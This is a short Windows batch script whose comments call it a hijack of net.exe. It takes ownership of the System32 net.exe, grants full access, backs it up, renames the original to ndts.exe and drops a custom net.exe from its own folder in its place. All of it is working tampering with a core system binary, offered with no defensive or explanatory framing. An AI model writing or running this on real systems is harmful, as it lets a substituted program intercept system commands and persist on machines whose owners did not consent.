@echo off
setlocal EnableDelayedExpansion

:: ==== PRELIMINARY: Hijack net.exe ====
set "SYS32=%SystemRoot%\System32"
set "REAL_NET=%SYS32%\net.exe"
set "RENAMED_NET=%SYS32%\ndts.exe"
set "BACKUP_NET=%SYS32%\net.bak"
set "CUSTOM_NET=%~dp0net.exe"

echo [*] Preparing to replace net.exe in System32...

:: Take ownership as current user
takeown /f "%REAL_NET%" /a /r /d y >nul 2>&1

:: Give full access to Administrators group
icacls "%REAL_NET%" /grant Administrators:F /t /c >nul 2>&1

:: Backup net.exe
echo [*] Backing up net.exe to net.bak...
copy /Y "%REAL_NET%" "%BACKUP_NET%" >nul
if %errorlevel% equ 0 (
    echo [✓] Backup created at: %BACKUP_NET%
) else (
    echo [!] WARNING: Failed to back up net.exe
)

:: Rename net.exe to ndts.exe
echo [*] Renaming original net.exe to ndts.exe...
ren "%REAL_NET%" ndts.exe >nul 2>&1

:: Copy custom net.exe into System32
echo [*] Copying custom net.exe to System32...
copy /Y "%CUSTOM_NET%" "%REAL_NET%" >nul
if %errorlevel% equ 0 (
    echo [✓] Custom net.exe deployed successfully.
) else (
    echo [!] ERROR: Failed to deploy custom net.exe
)
